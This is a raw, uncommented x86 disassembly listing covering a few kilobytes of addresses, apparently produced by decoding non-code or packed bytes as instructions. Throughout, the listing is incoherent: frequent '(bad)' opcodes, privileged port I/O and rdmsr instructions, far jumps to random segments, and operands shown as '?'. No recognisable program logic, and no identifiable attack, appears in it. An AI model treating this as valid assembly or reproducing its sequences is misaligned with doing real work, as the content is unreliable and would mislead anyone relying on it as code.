  4213f1:	fwait
  4213f2:	push   ebp
  4213f3:	pop    ebp
  4213f4:	jp     0x42142c
  4213f6:	sbb    DWORD PTR ds:0xf8bef6b6,edx
  4213fc:	xor    esi,DWORD PTR [ecx+0x3fb47536]
  421402:	pusha  
  421403:	xor    al,0xd6
  421405:	sbb    eax,0xd79189a5
  42140a:	dec    eax
  42140b:	mov    eax,ds:0xf80abb56
  421410:	loope  0x4213cf
  421412:	and    BYTE PTR [edx],al
  421414:	fsub   DWORD PTR [edi-0x357bb807]
  42141a:	ins    BYTE PTR es:[edi],dx
  42141b:	(bad)  
  42141c:	in     eax,dx
  42141d:	and    bl,dl
  42141f:	adc    al,0xe5
  421421:	mov    edi,0x6419fbf8
  421426:	in     al,0x3e
  421428:	push   edi
  421429:	jae    0x4213f0
  42142b:	xchg   esi,eax
  42142c:	ja     0x4213bd
  42142e:	ins    BYTE PTR es:[edi],dx
  42142f:	push   ss
  421430:	cmp    DWORD PTR [eax],esp
  421432:	or     cl,ah
  421434:	mov    esi,0xe7f054ee
  421439:	sbb    eax,0xfc738ef9
  42143e:	xor    bl,BYTE PTR [esi-0x6]
  421441:	mov    BYTE PTR [eax],dh
  421443:	mov    ds:0xfa20545a,al
  421448:	and    BYTE PTR [eax],0x51
  42144b:	adc    ebx,DWORD PTR [ecx+0x3fb01d5b]
  421451:	outs   dx,DWORD PTR ds:[esi]
  421452:	ficom  DWORD PTR [edi+0xd]
  421455:	push   ebp
  421456:	mov    eax,0x755cd93d
  42145b:	add    esp,DWORD PTR [edx]
  42145d:	push   ds
  42145e:	fs es dec esi
  421461:	cdq    
  421462:	jmp    0x9278e343
  421467:	fdiv   DWORD PTR [edi+edx*1-0x6b]
  42146b:	mov    ebx,edi
  42146d:	or     esp,DWORD PTR [ebp-0x54c367ab]
  421473:	jb     0x421499
  421475:	and    al,0x8c
  421477:	scas   eax,DWORD PTR es:[edi]
  421478:	js     0x42145a
  42147a:	mov    bl,0x52
  42147c:	xchg   esp,eax
  42147d:	mov    ds:0x8af5a573,al
  421482:	call   0x61c8:0x6886416f
  421489:	adc    DWORD PTR [edx+0x366b8f21],esp
  42148f:	cwde   
  421490:	in     al,0xd0
  421492:	test   DWORD PTR [ecx*4+0x713d5f09],ebp
  421499:	jno    0x42141f
  42149b:	mov    eax,ds:0x8c1aa0
  4214a0:	mov    ebp,0x6b81218a
  4214a5:	iret   
  4214a6:	ss pop ebx
  4214a8:	mov    al,0xbf
  4214aa:	outs   dx,BYTE PTR ds:[esi]
  4214ab:	or     BYTE PTR [edx-0x31],dh
  4214ae:	or     DWORD PTR [edx+0x2a],esp
  4214b1:	imul   esp,DWORD PTR [edx],0xffffffde
  4214b4:	fadd   QWORD PTR [eax]
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	pop    ds
  421523:	fstp   TBYTE PTR [ebx+0x161d62f]
  421529:	add    BYTE PTR [edi],al
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    bh,ah
  42152f:	push   ss
  421530:	sbb    DWORD PTR [edi],eax
  421532:	pop    ebp
  421533:	outs   dx,BYTE PTR ds:[esi]
  421534:	aaa    
  421535:	xchg   DWORD PTR [ebp+0x79],ebp
  421538:	jo     0x421566
  42153a:	add    ebx,DWORD PTR cs:[edx-0x34]
  42153e:	stos   BYTE PTR es:[edi],al
  42153f:	fistp  WORD PTR [ebp-0x7e37b7d9]
  421545:	mov    ebp,DWORD PTR [eax+0xe]
  421548:	jns    0x421540
  42154a:	test   al,0xa6
  42154c:	fcomip st,st(6)
  42154e:	pop    ecx
  42154f:	lods   eax,DWORD PTR ds:[esi]
  421550:	popf   
  421551:	mov    edi,0xfb4275b8
  421556:	fcomp  QWORD PTR [ebx-0x55]
  421559:	mov    ah,0xea
  42155b:	adc    ebp,esp
  42155d:	or     eax,DWORD PTR [ecx-0x59]
  421560:	and    DWORD PTR [ebx-0x3fc2e61c],ecx
  421566:	scas   eax,DWORD PTR es:[edi]
  421567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421568:	je     0x42154f
  42156a:	cmc    
  42156b:	cwde   
  42156c:	hlt    
  42156d:	jne    0x42158b
  42156f:	fadd   DWORD PTR [ecx+0xd971508]
  421575:	jae    0x421598
  421577:	mov    al,ds:0x43024900
  42157c:	or     esi,ebp
  42157e:	xlat   BYTE PTR ds:[ebx]
  42157f:	and    edi,ecx
  421581:	cmp    DWORD PTR [ebp+0x19],esi
  421584:	xchg   ebp,eax
  421585:	sbb    dh,BYTE PTR [eax+0x20c3e9a0]
  42158b:	jbe    0x421536
  42158d:	adc    edx,DWORD PTR [edi-0x615768a3]
  421593:	jle    0x421521
  421595:	js     0x421529
  421597:	fsub   st,st(1)
  421599:	mov    WORD PTR [esi+edx*8],ds
  42159c:	in     eax,dx
  42159d:	dec    esi
  42159e:	fild   QWORD PTR [esi+0x67]
  4215a1:	and    ebp,DWORD PTR [edx-0xd4a89dc]
  4215a7:	in     al,dx
  4215a8:	and    eax,0xd585f68b
  4215ad:	mov    edi,0x8b5c8af5
  4215b2:	mov    edx,0x592ff80a
  4215b7:	movlps xmm2,QWORD PTR [eax+0xf881e57]
  4215be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215bf:	std    
  4215c0:	retf   
  4215c1:	jecxz  0x4215a3
  4215c3:	inc    ebx
  4215c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215c5:	pop    ebp
  4215c6:	pop    esp
  4215c7:	and    esp,DWORD PTR [esp+edx*2-0x1]
  4215cb:	xor    al,0x5
  4215cd:	cmp    DWORD PTR [ebp-0x3e],eax
  4215d0:	adc    ecx,DWORD PTR [edi-0x27ad6b4e]
  4215d6:	jno    0x42160d
  4215d8:	xchg   esp,eax
  4215d9:	cmp    ecx,0xc067a7af
  4215df:	push   ebx
  4215e0:	ror    DWORD PTR [eax],0x97
  4215e3:	repz xor cl,BYTE PTR [ecx+0x1d]
  4215e7:	in     eax,0x77
  4215e9:	inc    ebx
  4215ea:	sbb    al,0x49
  4215ec:	out    dx,eax
  4215ed:	das    
  4215ee:	aam    0xd3
  4215f0:	out    0xe5,eax
  4215f2:	and    esi,DWORD PTR [ebx-0x2a9102f0]
  4215f8:	(bad)  
  4215f9:	dec    esp
  4215fa:	js     0x4215de
  4215fc:	imul   BYTE PTR [ecx+edx*4]
  4215ff:	fwait
  421600:	jnp    0x42165a
  421602:	out    dx,eax
  421603:	ret    
  421604:	mov    bh,0x4d
  421606:	add    eax,0x8345741a
  42160b:	retf   0x6cb1
  42160e:	mov    cl,0x9
  421610:	xor    al,bh
  421612:	shl    DWORD PTR [esi-0x557860cc],cl
  421618:	or     DWORD PTR [ebp+ebp*1-0x19e254a3],edx
  42161f:	push   esp
  421620:	inc    esi
  421621:	xchg   DWORD PTR [edi-0x13],esi
  421624:	add    dh,cl
  421626:	xchg   edi,eax
  421627:	mov    ecx,0xf8cdb741
  42162c:	mov    esi,0x859be173
  421631:	fs rol ebx,1
  421634:	add    al,BYTE PTR [eax]
	...
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	mov    ah,0x7c
  4216a4:	repz xchg ch,bl
  4216a7:	bound  eax,QWORD PTR [ecx]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    BYTE PTR [eax-0x9],bl
  4216b0:	out    dx,eax
  4216b1:	arpl   WORD PTR [esi+ebp*4+0x51b777ff],cx
  4216b8:	nop
  4216b9:	xchg   ebx,eax
  4216ba:	lds    esp,FWORD PTR [esi+0x62d3cdb9]
  4216c0:	xchg   esi,eax
  4216c1:	pusha  
  4216c2:	xchg   edx,eax
  4216c3:	outs   dx,DWORD PTR ds:[esi]
  4216c4:	pushf  
  4216c5:	ins    DWORD PTR es:[edi],dx
  4216c6:	aas    
  4216c7:	and    eax,DWORD PTR [eax+0x268c5c3f]
  4216cd:	xchg   esp,eax
  4216ce:	sub    BYTE PTR cs:[edx],cl
  4216d1:	add    BYTE PTR [edx-0x5b2b3084],bl
  4216d7:	stos   DWORD PTR es:[edi],eax
  4216d8:	loope  0x421751
  4216da:	sbb    BYTE PTR [edi],bh
  4216dc:	hlt    
  4216dd:	mov    al,0x88
  4216df:	imul   ecx,DWORD PTR [ebx-0x2301f380],0x4be0da50
  4216e9:	and    DWORD PTR [ecx],ebx
  4216eb:	add    eax,0xd6a8dc1f
  4216f0:	mov    bl,0xf4
  4216f2:	adc    ebx,DWORD PTR [bp+si+0x1fc0]
  4216f7:	rcr    al,1
  4216f9:	(bad)  
  4216fa:	fmul   DWORD PTR ds:0xfc4b595e
  421700:	cmp    dl,bh
  421702:	sbb    ecx,DWORD PTR [eax+0x4c712959]
  421708:	jle    0x421731
  42170a:	js     0x4216d9
  42170c:	jae    0x4216b4
  42170e:	jp     0x421699
  421710:	add    ch,BYTE PTR [ecx]
  421712:	mov    eax,0x7276a946
  421717:	mov    DWORD PTR [eax],edi
  421719:	mov    ebp,0x947d313b
  42171e:	arpl   WORD PTR [ebx+0x3490ce94],sp
  421724:	(bad)  
  421725:	lods   al,BYTE PTR ds:[esi]
  421726:	iret   
  421727:	pop    ds
  421728:	lock pop esp
  42172a:	inc    ecx
  42172b:	jmp    0x2690:0x502ef15a
  421732:	push   DWORD PTR [esi]
  421734:	outs   dx,BYTE PTR ds:[esi]
  421735:	pop    ecx
  421736:	cwde   
  421737:	sbb    eax,0x7b7507c3
  42173c:	addr16 push edx
  42173e:	inc    esp
  42173f:	jno    0x42179f
  421741:	sbb    DWORD PTR [edi-0x536ab46a],ecx
  421747:	mov    bl,0x9a
  421749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42174a:	mov    edx,0x20dfd301
  42174f:	pushf  
  421750:	pop    ds
  421751:	cmp    eax,0xdae93692
  421756:	imul   esi,DWORD PTR [esi-0x20],0xffffffb0
  42175a:	jp     0x421790
  42175c:	cwde   
  42175d:	dec    ebp
  42175e:	ins    DWORD PTR es:[edi],dx
  42175f:	data16 adc al,BYTE PTR [edi-0x19fcd331]
  421766:	lea    esp,[eax]
  421768:	in     eax,0x6f
  42176a:	dec    ebp
  42176b:	and    ecx,edx
  42176d:	jl     0x421715
  42176f:	in     al,0x86
  421771:	popa   
  421772:	das    
  421773:	data16 mov WORD PTR [edi+0x7d],ds
  421777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421778:	or     dh,ch
  42177a:	mov    esp,0xf7ac023f
  42177f:	or     bh,dh
  421781:	imul   ecx,ebp,0x25bc9c50
  421787:	sub    DWORD PTR [ebx],0x51f1bbfa
  42178d:	mov    al,0x24
  42178f:	mov    al,ds:0xfdb8c4da
  421794:	mov    cl,0x14
  421796:	jnp    0x42176b
  421798:	js     0x4217aa
  42179a:	pop    esi
  42179b:	mov    ecx,DWORD PTR [edx]
  42179d:	fmul   st(7),st
  42179f:	ins    BYTE PTR es:[edi],dx
  4217a0:	push   edx
  4217a1:	out    dx,eax
  4217a2:	push   ebx
  4217a3:	call   0x100a7e9a
  4217a8:	mov    esp,0xed0275d8
  4217ad:	add    ch,BYTE PTR [ebx-0x701acd00]
  4217b3:	dec    edx
  4217b4:	and    eax,0x0
	...
  421815:	add    cl,dl
  421817:	mov    al,ds:0xf9f9e0b9
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	push   ds
  421823:	add    ecx,DWORD PTR [esi+0x163e4d2]
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    al,dl
  42182f:	lea    ecx,[ecx-0x4e6c7982]
  421835:	imul   edi,DWORD PTR [ebx+0x75],0xffffffb2
  421839:	stc    
  42183a:	mov    edx,0x2faa1322
  42183f:	dec    ecx
  421840:	mul    BYTE PTR [ebp+0x79cb0129]
  421846:	sbb    bl,bl
  421848:	sub    ch,BYTE PTR [ebx+0x26]
  42184b:	loopne 0x421896
  42184d:	or     bl,BYTE PTR [ebp+0xc7117a2]
  421853:	inc    ebx
  421854:	outs   dx,DWORD PTR ds:[esi]
  421855:	sbb    dl,bl
  421857:	dec    esi
  421858:	cmc    
  421859:	xor    edx,DWORD PTR [esi-0x7541defa]
  42185f:	sub    eax,DWORD PTR [ebx+0x5cf87947]
  421865:	hlt    
  421866:	sub    dl,BYTE PTR [ebx+0x1f5b9b08]
  42186c:	sbb    DWORD PTR [edx-0x46],ebp
  42186f:	fdiv   DWORD PTR [edi-0x76346661]
  421875:	push   esi
  421876:	xor    ebx,esp
  421878:	(bad)  
  421879:	push   eax
  42187a:	mov    al,0x73
  42187c:	dec    ebx
  42187d:	ja     0x42187a
  42187f:	jnp    0x4218a2
  421881:	out    dx,al
  421882:	xchg   edi,eax
  421883:	test   al,0xbc
  421885:	jmp    0x78ac:0x5f6b4291
  42188c:	mov    cl,0xf6
  42188e:	add    al,BYTE PTR [ebp+0x6451fbc]
  421894:	out    0x70,eax
  421896:	push   0xdd239190
  42189b:	mov    cl,0x7f
  42189d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42189e:	xchg   edi,eax
  42189f:	adc    ch,dl
  4218a1:	dec    esp
  4218a2:	int    0xeb
  4218a4:	sar    ebx,1
  4218a6:	mov    ebx,0x114b7b
  4218ab:	push   ds
  4218ac:	outs   dx,BYTE PTR ds:[esi]
  4218ad:	sub    ah,bl
  4218af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218b0:	dec    esp
  4218b1:	aas    
  4218b2:	lahf   
  4218b3:	aaa    
  4218b4:	loope  0x4218d2
  4218b6:	dec    ebp
  4218b7:	jg     0x4218e6
  4218b9:	cli    
  4218ba:	cli    
  4218bb:	(bad)  
  4218bd:	outs   dx,BYTE PTR ds:[esi]
  4218be:	and    ecx,ebx
  4218c0:	fst    DWORD PTR [eax]
  4218c2:	mov    ch,0xaa
  4218c4:	inc    esp
  4218c5:	out    dx,al
  4218c6:	fs cdq 
  4218c8:	shl    BYTE PTR [edx+0x15],1
  4218cb:	add    DWORD PTR [ecx-0x6a],ebx
  4218ce:	(bad)  
  4218cf:	out    0x30,al
  4218d1:	loop   0x42192f
  4218d3:	sub    eax,0x793e0965
  4218d8:	pusha  
  4218d9:	inc    edi
  4218da:	test   eax,ebx
  4218dc:	jp     0x4218b7
  4218de:	dec    ebx
  4218df:	adc    bl,BYTE PTR [esi+0x5177092c]
  4218e5:	pushf  
  4218e6:	cmp    ah,BYTE PTR [edx+0x50]
  4218e9:	push   cs
  4218ea:	(bad)  
  4218eb:	xlat   BYTE PTR ds:[ebx]
  4218ec:	push   esi
  4218ed:	icebp  
  4218ee:	inc    ebp
  4218ef:	fst    DWORD PTR [edi]
  4218f1:	jmp    0x42192c
  4218f3:	pop    ss
  4218f4:	hlt    
  4218f5:	test   eax,0x91816371
  4218fa:	sti    
  4218fb:	aaa    
  4218fc:	and    BYTE PTR [eax],dl
  4218fe:	push   ebx
  4218ff:	xchg   DWORD PTR [edi+0x42bd0219],ebp
  421905:	add    BYTE PTR [esi-0x5d2e55db],cl
  42190b:	lods   al,BYTE PTR ds:[esi]
  42190c:	mov    ?,WORD PTR [eax]
  42190e:	ror    BYTE PTR [esi+edi*4-0x10],1
  421912:	sub    bl,0x56
  421915:	inc    edi
  421916:	sbb    DWORD PTR [eax],edx
  421918:	xor    ah,cl
  42191a:	jecxz  0x421938
  42191c:	xchg   edx,eax
  42191d:	test   BYTE PTR [ebp+ebp*8-0x16],0x2c
  421922:	or     BYTE PTR [eax+0xb3fe06e],ah
  421928:	sub    bh,bl
  42192a:	mov    ebp,0xc63ad74
  42192f:	xchg   ebp,eax
  421930:	into   
  421931:	bound  esi,QWORD PTR [ebx+0x4a83]
	...
  421993:	add    BYTE PTR [eax],al
  421995:	add    dh,bh
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx-0x1d2d659b],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [esi*1-0x6cd8dd51],bh
  4219b4:	inc    esp
  4219b5:	(bad)  
  4219b7:	pop    edi
  4219b8:	xor    dl,BYTE PTR [ebx-0x58]
  4219bb:	fadd   QWORD PTR [esi]
  4219bd:	sbb    al,ch
  4219bf:	imul   edx,DWORD PTR [esi-0x26],0xffffff82
  4219c3:	push   eax
  4219c4:	in     al,dx
  4219c5:	or     eax,0xc93e736f
  4219ca:	(bad)  
  4219cb:	jnp    0x421992
  4219cd:	mov    edx,0x5b221fba
  4219d2:	jne    0x421a39
  4219d4:	sub    eax,0xa1f5bcf
  4219d9:	or     al,0x55
  4219db:	dec    esi
  4219dc:	and    DWORD PTR [edx],0xb06672cd
  4219e2:	add    al,0x69
  4219e4:	lds    ecx,FWORD PTR [edi+edi*2+0x79]
  4219e8:	dec    ecx
  4219e9:	cmp    DWORD PTR [edx+0x48217ac1],esp
  4219ef:	fimul  DWORD PTR [edx]
  4219f1:	push   cs
  4219f2:	mov    ebx,0x4c91b4c9
  4219f7:	in     al,0x0
  4219f9:	imul   esp,DWORD PTR [eax+0x74],0x97124b9e
  421a00:	jg     0x4219c3
  421a02:	cmp    BYTE PTR [ecx+0x430498f7],ah
  421a08:	call   0xa929:0x95582cbb
  421a0f:	sub    eax,0x7d655265
  421a14:	pop    eax
  421a15:	int    0xf
  421a17:	nop
  421a18:	fwait
  421a19:	shr    DWORD PTR [ebx],cl
  421a1b:	retf   
  421a1c:	xchg   esp,eax
  421a1d:	pushw  fs
  421a20:	imul   esi,DWORD PTR ds:0x7ecc0ac3,0xffffff8a
  421a27:	out    0x7c,al
  421a29:	mov    esp,DWORD PTR [eax+edx*2-0xb]
  421a2d:	in     eax,dx
  421a2e:	cmc    
  421a2f:	aam    0xd5
  421a31:	push   esp
  421a32:	dec    edi
  421a33:	imul   esi,DWORD PTR [edx],0x3b614a3e
  421a39:	pop    ebp
  421a3a:	dec    esp
  421a3b:	iret   
  421a3c:	(bad)  
  421a3d:	jae    0x421a7b
  421a3f:	mov    fs,WORD PTR [esi+edx*1+0x65803d77]
  421a46:	or     al,0x54
  421a48:	in     al,dx
  421a49:	cwde   
  421a4a:	jbe    0x421aa4
  421a4c:	scas   eax,DWORD PTR es:[edi]
  421a4d:	mov    cl,0xef
  421a4f:	outs   dx,DWORD PTR ds:[esi]
  421a50:	mov    dh,0xef
  421a52:	fdiv   DWORD PTR [edx-0x38ab1c0e]
  421a58:	mov    cl,0x18
  421a5a:	dec    ecx
  421a5b:	daa    
  421a5c:	xor    edi,ebp
  421a5e:	repz out dx,al
  421a60:	sti    
  421a61:	(bad)  
  421a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a63:	in     eax,dx
  421a64:	mov    bl,0x3f
  421a66:	add    eax,0x7c33bd86
  421a6b:	xor    dl,BYTE PTR [eax+ebx*1-0xd539989]
  421a72:	jg     0x421a9f
  421a74:	mov    al,ds:0xfcefbe89
  421a79:	pop    eax
  421a7a:	xchg   ecx,eax
  421a7b:	int3   
  421a7c:	fisubr DWORD PTR [edx+0x52]
  421a7f:	push   esi
  421a80:	xor    al,0xb5
  421a82:	rol    BYTE PTR [edx],0xd0
  421a85:	add    al,0xc
  421a87:	sar    ch,1
  421a89:	scas   al,BYTE PTR es:[edi]
  421a8a:	adc    dh,BYTE PTR [ebx-0x39]
  421a8d:	mov    edi,0xada43b3a
  421a92:	adc    al,0x3a
  421a94:	rdmsr  
  421a96:	leave  
  421a97:	xlat   BYTE PTR ds:[ebx]
  421a98:	clc    
  421a99:	mov    dh,0xb2
  421a9b:	inc    eax
  421a9c:	dec    ebp
  421a9d:	jmp    0x421a2c
  421a9f:	cmp    eax,0x4853e07
  421aa4:	mov    cl,0x92
  421aa6:	jmp    0xd96a8ba
  421aab:	retf   
  421aac:	jp     0x421b20
  421aae:	mov    ebp,0x24e29581
  421ab3:	(bad)  
  421ab4:	push   ebx
	...
  421b15:	add    BYTE PTR [esi],dl
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x4e976939],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [esi+0x37b064f2],ah
  421b33:	or     al,0xf6
  421b35:	(bad)  
  421b36:	fsub   st,st(0)
  421b38:	stos   BYTE PTR es:[edi],al
  421b39:	mov    BYTE PTR [esi+0x5b045a26],bl
  421b3f:	sub    ecx,DWORD PTR [ecx-0xd]
  421b42:	pop    ss
  421b43:	xor    eax,0x275771bb
  421b48:	inc    ecx
  421b49:	inc    ebp
  421b4a:	jbe    0x421b92
  421b4c:	add    al,0xbc
  421b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b4f:	lock jns 0x421ae6
  421b52:	stc    
  421b53:	and    BYTE PTR [esp+ebp*8-0x927f68b],dh
  421b5a:	jae    0x421aec
  421b5c:	icebp  
  421b5d:	or     DWORD PTR [ebp-0x4fc39aa8],edi
  421b63:	or     BYTE PTR [edi+0x17],ch
  421b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b67:	sub    al,0x19
  421b69:	frstor [esi+ecx*8-0x57c920c2]
  421b70:	imul   esi,DWORD PTR [ecx],0x7f
  421b73:	add    eax,0x20a17128
  421b78:	addr16 push ds
  421b7a:	inc    ebp
  421b7b:	jmp    0x421bc8
  421b7d:	lock jecxz 0x421bba
  421b80:	(bad)  
  421b81:	fisubr WORD PTR [ebx+eiz*4-0x29]
  421b85:	pop    ebx
  421b86:	jecxz  0x421b0f
  421b88:	js     0x421b4c
  421b8a:	fistp  WORD PTR [eax-0x71a44157]
  421b90:	popaw  
  421b92:	ins    DWORD PTR es:[edi],dx
  421b93:	out    0xdb,eax
  421b95:	rol    BYTE PTR [ecx-0x319119e3],1
  421b9b:	jnp    0x421b25
  421b9d:	ror    ecx,1
  421b9f:	push   ecx
  421ba0:	cld    
  421ba1:	sti    
  421ba2:	scas   al,BYTE PTR es:[edi]
  421ba3:	mov    ds,WORD PTR [ecx+ebp*4]
  421ba6:	xchg   edx,eax
  421ba7:	sub    dl,dl
  421ba9:	hlt    
  421baa:	ins    DWORD PTR es:[edi],dx
  421bab:	icebp  
  421bac:	xlat   BYTE PTR ds:[ebx]
  421bad:	xor    ecx,DWORD PTR [esi]
  421baf:	xchg   esi,eax
  421bb0:	pusha  
  421bb1:	mov    bl,0xc2
  421bb3:	hlt    
  421bb4:	sub    ch,ah
  421bb6:	xrelease mov BYTE PTR ds:[esi+ebp*1],bl
  421bbb:	mov    edi,0xda84dbef
  421bc0:	dec    edi
  421bc1:	push   0x34
  421bc3:	ins    BYTE PTR es:[edi],dx
  421bc4:	xor    DWORD PTR [esi-0x47],esp
  421bc7:	push   ebx
  421bc8:	aad    0x68
  421bca:	test   al,0xcf
  421bcc:	mov    edx,0x4e0aed73
  421bd1:	pop    ebx
  421bd2:	or     DWORD PTR [esp+eax*4],esp
  421bd5:	sbb    DWORD PTR [ebp+0x14],ecx
  421bd8:	in     eax,0x7d
  421bda:	test   DWORD PTR [ebp+ebp*2-0x74],edi
  421bde:	test   al,0x56
  421be0:	repnz adc eax,0xd886c7e9
  421be6:	mov    esi,0xa697837d
  421beb:	fidiv  DWORD PTR [edi+0x49]
  421bee:	je     0x421b98
  421bf0:	outs   dx,DWORD PTR ds:[esi]
  421bf1:	lahf   
  421bf2:	sar    BYTE PTR [edx+edi*4+0x7a],1
  421bf6:	mov    al,ds:0xd07813f0
  421bfb:	fwait
  421bfc:	mov    WORD PTR [edi+0x3a],?
  421bff:	add    eax,0xbd65bbb8
  421c04:	clc    
  421c05:	loop   0x421c16
  421c07:	inc    esp
  421c08:	inc    ebx
  421c09:	sti    
  421c0a:	jnp    0x421bbf
  421c0c:	mov    dl,0x87
  421c0e:	mov    al,ds:0xc870fb57
  421c13:	and    BYTE PTR [ebp-0x56],0xf4
  421c17:	repnz mov ds:0x4229894c,eax
  421c1d:	cmp    al,0x44
  421c1f:	inc    ebp
  421c20:	xchg   bh,dl
  421c22:	sbb    BYTE PTR [ecx+edi*2+0x8799252],bl
  421c29:	cvttps2pi mm1,QWORD PTR [edi+0x78]
  421c2d:	xchg   esi,eax
  421c2e:	aaa    
  421c2f:	mov    gs:0x5faa739a,al
	...
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp-0x672767e7],0xe2
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [edx+0x6d],dh
  421cb0:	aaa    
  421cb1:	call   0x195fd952
  421cb6:	loope  0x421d2a
  421cb8:	xor    BYTE PTR [esi+ecx*8],ah
  421cbb:	ss ins BYTE PTR es:[edi],dx
  421cbd:	cld    
  421cbe:	xor    dl,BYTE PTR [edi+0x84c771d]
  421cc4:	pop    ebp
  421cc5:	cmp    ah,al
  421cc7:	sbb    al,0x3b
  421cc9:	add    esp,DWORD PTR [ebp-0x770067ec]
  421ccf:	mov    bh,0x23
  421cd1:	popa   
  421cd2:	sub    edi,DWORD PTR [edi]
  421cd4:	jnp    0x421d54
  421cd6:	gs jle 0x421d31
  421cd9:	jne    0x421cc1
  421cdb:	ret    
  421cdc:	(bad)  
  421cdd:	aad    0xad
  421cdf:	pop    ds
  421ce0:	mov    ecx,0xf498e2bf
  421ce5:	sbb    dh,0x76
  421ce8:	dec    ebx
  421ce9:	test   DWORD PTR ds:[ebp+esi*2+0x30c04046],ebp
  421cf1:	and    ebp,edi
  421cf3:	mov    bh,0x8d
  421cf5:	repnz mov ?,edi
  421cf8:	jns    0x421d66
  421cfa:	add    bh,BYTE PTR [ebx-0x67]
  421cfd:	(bad)  
  421cfe:	jecxz  0x421cd6
  421d00:	cmc    
  421d01:	lds    edi,FWORD PTR [ecx+0x4728a330]
  421d07:	clc    
  421d08:	dec    eax
  421d09:	test   bl,0xc6
  421d0c:	imul   ecx,DWORD PTR [edi+0x1302343c],0x2e8e24b4
  421d16:	sbb    eax,0x1336e0c0
  421d1b:	stc    
  421d1c:	(bad)  
  421d1d:	loopne 0x421cf6
  421d1f:	inc    edi
  421d20:	fld    DWORD PTR [ecx-0x25]
  421d23:	mov    edx,0x2626c0ea
  421d28:	sub    eax,0xf3a67280
  421d2d:	loop   0x421cc9
  421d2f:	cmc    
  421d30:	out    dx,eax
  421d31:	in     al,dx
  421d32:	stos   BYTE PTR es:[edi],al
  421d33:	xor    ch,0x91
  421d36:	mov    ds:0xcf035250,al
  421d3b:	pop    edx
  421d3c:	sub    DWORD PTR [ebp+0x20],edi
  421d3f:	push   cs
  421d40:	stos   DWORD PTR es:[edi],eax
  421d41:	fisubr DWORD PTR [ebp+0x65]
  421d44:	nop
  421d45:	xchg   edi,eax
  421d46:	loop   0x421d91
  421d48:	jns    0x421d0a
  421d4a:	daa    
  421d4b:	mov    esi,0xac399f80
  421d50:	fdivr  QWORD PTR [edi+0x51]
  421d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d54:	(bad)  
  421d55:	pop    esp
  421d56:	aaa    
  421d57:	xor    eax,0xc34fe993
  421d5c:	jp     0x421cfb
  421d5e:	cmp    ebx,DWORD PTR [esi]
  421d60:	rol    BYTE PTR [ecx],cl
  421d62:	mov    ah,BYTE PTR [esi-0x21]
  421d65:	inc    ecx
  421d66:	mov    dl,0x96
  421d68:	cmp    DWORD PTR [edx+0x29],esi
  421d6b:	jo     0x421d42
  421d6d:	in     eax,dx
  421d6e:	(bad)
  421d71:	pop    es
  421d72:	test   eax,0xe77da6ea
  421d77:	in     al,0x5f
  421d79:	ret    0x567f
  421d7c:	pop    ebx
  421d7d:	shl    DWORD PTR [edx],1
  421d7f:	fistp  DWORD PTR [esi-0x34427281]
  421d85:	bound  edx,QWORD PTR [ecx]
  421d87:	dec    ebx
  421d88:	int    0x38
  421d8a:	imul   esp,DWORD PTR [esi],0xb66f812c
  421d90:	adc    BYTE PTR [esi+edi*1],0xd3
  421d94:	pop    ds
  421d95:	das    
  421d96:	(bad)  
  421d98:	shl    DWORD PTR [ecx+0x32],1
  421d9b:	lock cld 
  421d9d:	push   0xe4b2a8f7
  421da2:	bound  edx,QWORD PTR [edi]
  421da4:	adc    eax,0x9edfb6d6
  421da9:	shr    BYTE PTR [ebp+eax*2+0x34],0xc6
  421dae:	test   eax,0xee129f73
  421db3:	hlt    
  421db4:	xchg   esp,eax
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [edx],al
  421e23:	mov    al,ds:0x6800d021
  421e28:	add    DWORD PTR [eax],eax
  421e2a:	pop    es
  421e2b:	add    DWORD PTR [eax],eax
  421e2d:	add    BYTE PTR [ebp+0x62],dh
  421e30:	iret   
  421e31:	in     eax,0x53
  421e33:	mov    al,0xe1
  421e35:	and    BYTE PTR [ebx-0x2b],dh
  421e38:	mov    bh,0xcd
